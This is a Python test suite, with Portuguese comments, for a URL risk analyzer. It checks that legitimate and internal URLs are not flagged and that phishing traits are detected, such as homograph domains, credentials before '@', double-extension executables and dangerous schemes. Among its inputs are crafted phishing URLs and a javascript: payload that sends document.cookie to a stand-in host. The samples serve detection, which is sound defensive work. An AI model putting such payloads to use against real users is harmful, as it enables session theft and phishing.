"""Testes da analise de URL submetida diretamente.

A medida de qualidade aqui e a mesma dos outros analisadores: nao e "achou o
indicador", e "nao gritou a toa". URL legitima que pontua alto destroi a
confianca na ferramenta mais rapido do que URL maliciosa que passa.
"""

import pytest

from app.analyzers.url_analyzer import analyze_url
from app.services.url_service import analyze_url_evidence


def ids(url: str) -> list[str]:
    """Analisa uma URL e devolve os ids dos indicadores disparados."""
    return [indicator.id for indicator in analyze_url_evidence(url).risk.indicators]


def score(url: str) -> int:
    return analyze_url_evidence(url).risk.score


class TestLegitimateUrls:
    """O caso que mais importa: URL comum nao pode pontuar."""

    @pytest.mark.parametrize(
        "url",
        [
            "https://www.imobibrasil.com.br/planos.php",
            "https://github.com/Vinicius-Rampazzo/forensic-guard",
            "https://docs.python.org/3/library/ipaddress.html",
            "https://empresa.com.br/area-do-cliente/faturas?mes=10&ano=2026",
            "https://sub.dominio.empresa.com.br/caminho",
        ],
    )
    def test_ordinary_urls_score_zero(self, url: str) -> None:
        assert ids(url) == []
        assert score(url) == 0

    @pytest.mark.parametrize(
        "url",
        [
            "http://127.0.0.1:8000/docs",
            "http://localhost:8000/docs",
            "http://192.168.0.10/painel",
            "http://intranet/relatorios",
            "http://impressora.local/status",
        ],
    )
    def test_internal_hosts_are_not_flagged(self, url: str) -> None:
        """Endereco interno e trafego normal, nao evasao.

        Sem esta excecao, `http://localhost:8000/docs` - a propria
        documentacao desta API - pontuaria por HTTP sem TLS e por porta fora
        do padrao. Uma ferramenta que acusa a si mesma perde a confianca de
        quem a usa.

        A verificacao cobre tanto o endereco (127.0.0.1, 192.168.x) quanto o
        NOME: `localhost`, sufixos reservados como `.local`, e nomes sem
        ponto, que so resolvem dentro de uma rede.
        """
        assert ids(url) == []


class TestHostChecks:
    """Verificacoes sobre o host."""

    def test_public_ip_address(self) -> None:
        assert "url.ip_address_host" in ids("http://45.33.32.156/payload.bin")

    def test_documentation_range_counts_as_public(self) -> None:
        """Faixa de documentacao nao e rede interna.

        O `is_private` do modulo ipaddress inclui 203.0.113.0/24 junto com as
        redes locais - um agrupamento que faz sentido para roteamento, mas nao
        para esta analise. Um IP desses numa URL recebida e tao estranho
        quanto qualquer outro.
        """
        assert "url.ip_address_host" in ids("http://203.0.113.45/x")

    def test_punycode_domain(self) -> None:
        assert "url.punycode_domain" in ids("https://xn--80ak6aa92e.com/login")

    def test_mixed_writing_systems(self) -> None:
        """Ataque homografo: "а" cirilico dentro de um nome latino.

        As duas URLs sao visualmente identicas e levam a lugares diferentes.
        """
        # xn--pple-43d.com decodifica para аpple.com, com A cirilico.
        found = ids("https://xn--pple-43d.com/conta")

        assert "url.mixed_scripts" in found

    def test_risky_tld(self) -> None:
        assert "url.risky_tld" in ids("http://seguranca-banco.tk/login")

    def test_file_extension_tld(self) -> None:
        """`.zip` e `.mov` colidem com extensoes de arquivo de proposito."""
        assert "url.risky_tld" in ids("https://relatorio-anual.zip/")

    def test_excessive_subdomains(self) -> None:
        url = "https://banco.com.br.seguranca-conta.exemplo.com/login"

        assert "url.excessive_subdomains" in ids(url)

    def test_brazilian_domain_is_not_excessive(self) -> None:
        """`empresa.com.br` tem tres rotulos e nenhum subdominio.

        Sem a lista de sufixos compostos, todo site brasileiro legitimo
        pareceria ter um subdominio a mais e seria marcado.
        """
        assert "url.excessive_subdomains" not in ids("https://www.empresa.com.br/x")

    def test_url_shortener(self) -> None:
        assert "url.shortener" in ids("https://bit.ly/3xYzAbC")


class TestAuthorityChecks:
    """Credenciais e porta."""

    def test_credentials_in_url(self) -> None:
        """Tudo antes do @ e ignorado pelo navegador ao resolver o endereco."""
        found = ids("http://www.banco.com.br@evil.example/login")

        assert "url.credentials_in_url" in found

    def test_the_real_host_is_reported_as_evidence(self) -> None:
        """A evidencia precisa mostrar para onde a URL REALMENTE vai."""
        response = analyze_url_evidence("http://www.banco.com.br@evil.example/login")

        indicator = next(
            item for item in response.risk.indicators if item.id == "url.credentials_in_url"
        )

        assert indicator.evidence["actual_host"] == "evil.example"

    def test_password_value_is_never_returned(self) -> None:
        """A senha pode ser real, de alguem que colou a propria URL de acesso."""
        response = analyze_url_evidence("https://usuario:senhaSecreta@servidor.com/")

        indicator = next(
            item for item in response.risk.indicators if item.id == "url.credentials_in_url"
        )

        assert indicator.evidence["password_present"] is True
        assert "senhaSecreta" not in str(indicator.evidence)

    def test_non_standard_port(self) -> None:
        assert "url.non_standard_port" in ids("https://exemplo.com:8443/painel")

    def test_standard_port_written_out_is_not_flagged(self) -> None:
        assert "url.non_standard_port" not in ids("https://exemplo.com:443/x")


class TestPathChecks:
    """Verificacoes sobre o caminho."""

    def test_executable_download(self) -> None:
        assert "url.executable_download" in ids("https://exemplo.com/update.exe")

    def test_double_extension(self) -> None:
        """`fatura.pdf.exe` aparece como "fatura.pdf" no Windows."""
        found = ids("https://exemplo.com/documentos/fatura.pdf.exe")

        assert "url.double_extension" in found
        assert "url.executable_download" in found

    def test_encoded_extension_is_decoded_first(self) -> None:
        """`%2Eexe` precisa ser lido como `.exe`.

        Sem decodificar, a verificacao seria contornada com uma unica
        substituicao de caractere.
        """
        assert "url.executable_download" in ids("https://exemplo.com/nota%2Eexe")

    def test_ordinary_document_is_not_flagged(self) -> None:
        assert "url.executable_download" not in ids("https://exemplo.com/fatura.pdf")


class TestSchemeChecks:
    """Verificacoes sobre o esquema."""

    def test_javascript_scheme(self) -> None:
        found = ids("javascript:fetch('http://evil.example/'+document.cookie)")

        assert "url.dangerous_scheme" in found

    def test_data_scheme(self) -> None:
        """`data:` carrega a pagina inteira dentro da propria URL.

        Um formulario de phishing assim nao tem servidor para derrubar nem
        dominio para denunciar.
        """
        assert "url.dangerous_scheme" in ids("data:text/html;base64,PGh0bWw+")

    def test_http_without_tls(self) -> None:
        assert "url.insecure_scheme" in ids("http://exemplo.com/login")

    def test_https_is_not_flagged(self) -> None:
        assert "url.insecure_scheme" not in ids("https://exemplo.com/login")


class TestObfuscation:
    """Comprimento, codificacao e host numerico."""

    def test_numeric_host(self) -> None:
        """`0x2d21209c` e o mesmo endereco de `45.33.32.156`."""
        assert "url.obfuscated" in ids("http://0x2d21209c/")

    def test_very_long_url(self) -> None:
        url = "https://exemplo.com/" + "a" * 200

        assert "url.obfuscated" in ids(url)

    def test_heavy_percent_encoding(self) -> None:
        url = "https://exemplo.com/" + "%41" * 12

        assert "url.obfuscated" in ids(url)


class TestCombined:
    """O caso completo, somando as verificacoes."""

    def test_a_thoroughly_hostile_url_reaches_critical(self) -> None:
        url = (
            "http://www.banco.com.br@banco.com.br.seguranca.phish.tk:8443"
            "/area/fatura.pdf.exe"
        )

        response = analyze_url_evidence(url)
        found = [indicator.id for indicator in response.risk.indicators]

        assert response.risk.level == "critical"
        assert "url.credentials_in_url" in found
        assert "url.risky_tld" in found
        assert "url.double_extension" in found
        assert "url.executable_download" in found
        assert "url.non_standard_port" in found
        assert "url.insecure_scheme" in found

    def test_every_indicator_carries_evidence(self) -> None:
        """Indicador sem evidencia e opiniao, nao observacao."""
        url = "http://45.33.32.156@phish.tk:8080/nota.pdf.exe"

        for indicator in analyze_url_evidence(url).risk.indicators:
            assert indicator.evidence, indicator.id


class TestParsing:
    """A URL dissecada e as entradas malformadas."""

    def test_splits_the_url_into_parts(self) -> None:
        parts = analyze_url_evidence("https://loja.empresa.com.br:8443/produtos?id=7#topo").parts

        assert parts.scheme == "https"
        assert parts.host == "loja.empresa.com.br"
        assert parts.registrable_domain == "empresa.com.br"
        assert parts.subdomains == ["loja"]
        assert parts.tld == "br"
        assert parts.port == 8443
        assert parts.path == "/produtos"
        assert parts.query == "id=7"
        assert parts.fragment == "topo"

    def test_shows_how_punycode_displays(self) -> None:
        """Quem le o relatorio precisa ver o que a vitima veria."""
        parts = analyze_url_evidence("https://xn--80ak6aa92e.com/").parts

        assert parts.host.startswith("xn--")
        assert parts.unicode_host is not None
        assert not parts.unicode_host.startswith("xn--")

    def test_empty_url_is_reported_as_error(self) -> None:
        response = analyze_url_evidence("   ")

        assert response.error is not None
        assert response.risk.score == 0

    def test_garbage_does_not_raise(self) -> None:
        """Entrada arbitraria nao pode derrubar a analise."""
        for value in ["nao e uma url", "http://", "://", "ht tp://x.com", "\x00\x01"]:
            analyze_url_evidence(value)

    def test_whitespace_is_trimmed(self) -> None:
        """Colar uma URL costuma trazer espaco ou quebra de linha junto."""
        response = analyze_url_evidence("  https://exemplo.com/x\n")

        assert response.url == "https://exemplo.com/x"


class TestAnalyzerDirectly:
    """O analisador por baixo, sem passar pelo servico."""

    def test_reports_the_decoded_host(self) -> None:
        analysis = analyze_url("https://xn--pple-43d.com/")

        assert analysis.parts.unicode_host != analysis.parts.host

    def test_private_host_is_marked(self) -> None:
        assert analyze_url("http://192.168.1.1/").private_host is True

    def test_public_host_is_not_marked_private(self) -> None:
        assert analyze_url("http://45.33.32.156/").private_host is False
